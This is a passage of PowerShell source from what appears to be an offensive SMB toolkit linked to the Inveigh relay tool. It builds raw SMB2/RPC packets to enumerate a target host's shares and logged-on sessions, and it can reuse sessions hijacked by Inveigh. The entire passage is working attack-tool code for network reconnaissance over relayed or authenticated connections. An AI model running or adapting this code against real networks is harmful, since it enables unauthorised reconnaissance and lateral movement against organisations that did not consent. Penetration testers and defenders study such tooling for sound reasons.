                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage_next = 'ParseSRVSVC'
                        
                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }
                        else
                        {
                            $SMB_client_stage = 'StatusPending'
                        }

                    }

                    'ParseSRVSVC'
                    {
                        $response_object_list = @()
                        [Byte[]]$response_count_bytes = $SMB_client_receive[152..155]
                        $response_count = [System.BitConverter]::ToInt32($response_count_bytes,0)
                        $response_item_index = 164
                        $i = 0

                        while($i -lt $response_count)
                        {

                            if($i -gt 0)
                            {

                                if($response_item_length % 2)
                                {
                                    $response_item_index += $response_item_length * 2 + 2
                                }
                                else
                                {
                                    $response_item_index += $response_item_length * 2
                                }

                            }
                            else
                            {
                                
                                if($action -eq 'Share')
                                {
                                    $response_item_index += $response_count * 12
                                }
                                else
                                {
                                    $response_item_index += $response_count * 16
                                }

                            }

                            $response_item_object = New-Object PSObject
                            [Byte[]]$response_item_length_bytes = $SMB_client_receive[$response_item_index..($response_item_index + 3)]
                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)
                            $response_item_index += 12
                            [Byte[]]$response_item_bytes = $SMB_client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]
                            $response_item = [System.BitConverter]::ToString($response_item_bytes)
                            $response_item = $response_item -replace "-00",""
                            $response_item = $response_item.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_item = New-Object System.String ($response_item,0,$response_item.Length)
                            
                            if($response_item_length % 2)
                            {
                                $response_item_index += $response_item_length * 2 + 2
                            }
                            else
                            {
                                $response_item_index += $response_item_length * 2
                            }
                            
                            [Byte[]]$response_item_length_bytes = $SMB_client_receive[$response_item_index..($response_item_index + 3)]
                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)
                            $response_item_index += 12
                            [Byte[]]$response_item_2_bytes = $SMB_client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]
                            $response_item_2 = [System.BitConverter]::ToString($response_item_2_bytes)
                            $response_item_2 = $response_item_2 -replace "-00",""
                            $response_item_2 = $response_item_2.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_item_2 = New-Object System.String ($response_item_2,0,$response_item_2.Length)
                            $response_object_list += $response_item_object
                            $i++

                            if($action -eq 'Share')
                            {
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Share $response_item
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Description $response_item_2
                            }
                            else
                            {
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Username $response_item_2
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Source $response_item
                            }

                        }

                        Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                        $SMB_client_stage = 'CloseRequest'
                    }

                    'NetSessEnum'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SRVSVC_data = New-PacketSRVSVCNetSessEnum $Target
                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $SMB_file_GUID $SRVSVC_data.Length 1024
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00                        
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length + $SRVSVC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SRVSVC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SRVSVC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage_next = 'ParseSRVSVC'
                        
                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }
                        else
                        {
                            $SMB_client_stage = 'StatusPending'
                        }     
                    }

                    'CloseRequest'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }
      
                        $packet_SMB2_data = New-PacketSMB2CloseRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SAMR_step -eq 2)
                        {
                            $SMB_client_stage = 'CreateRequest'
                        }
                        else
                        {
                            $SMB_client_stage = 'TreeDisconnect'
                        }
                        
                    }

                    'TreeDisconnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }
          
                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($inveigh_session -and !$Logoff)
                        {
                            $SMB_client_stage = 'Exit'
                        }
                        else
                        {
                            $SMB_client_stage = 'Logoff'
                        }

                    }

                    'Logoff'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }
         
                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }
                
                if($SMBExec_failed)
                {
                    BREAK SMB_execute_loop
                }
            
            }

        }

    }

    if($inveigh_session -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = 'open'
        $inveigh.session_message_ID_table[$session] = $SMB2_message_ID
        $inveigh.session_list[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
    }

    if(!$inveigh_session -or $Logoff)
    {
        $SMB_client.Close()
        $SMB_client_stream.Close()
    }

}

}